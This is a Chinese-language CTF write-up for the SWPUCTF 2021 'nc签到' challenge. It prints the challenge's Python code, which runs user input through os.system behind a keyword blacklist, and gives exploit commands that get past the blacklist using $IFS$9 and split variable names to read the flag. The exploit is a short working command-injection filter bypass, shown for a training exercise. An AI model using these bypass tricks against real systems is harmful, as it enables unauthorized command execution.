# SWPUCTF 2021 新生赛 nc签到


# 思路

根据题目给出的代码：

```python
import os

art = '''

   ((  "####@@!!$$    ))
       `#####@@!$$`  ))
    ((  '####@!!$:
   ((  ,####@!!$:   ))
       .###@!!$:
       `##@@!$:
        `#@!!$
  !@#    `#@!$:       @#$
   #$     `#@!$:       !@!
            '@!$:
        '`\   "!$: /`'
           '\  '!: /'
             "\ : /"
  -."-/\\\-."//.-"/:`\."-.JrS"."-=_\\
" -."-.\\"-."//.-".`-."_\\-.".-\".-//'''
print(art)
print("My_shell_ProVersion")

blacklist = ['cat','ls',' ','cd','echo','<','${IFS}']

while True:
    command = input()
    for i in blacklist:
        if i in command:
            exit(0)
    os.system(command)
```

看出来实际上是一道绕过WAF的RCE题目。需要绕过的名单是：``['cat','ls',' ','cd','echo','<','${IFS}']``

这里空格可以用`$IFS$9`代替，然后命令的话创建变量替换即可。

# exp

```bash
a=l;b=s;$a${b}$IFS$9\
a=c;b=at;$a${b}$IFS$9flag
```

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20230924103054265.png)


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0/  

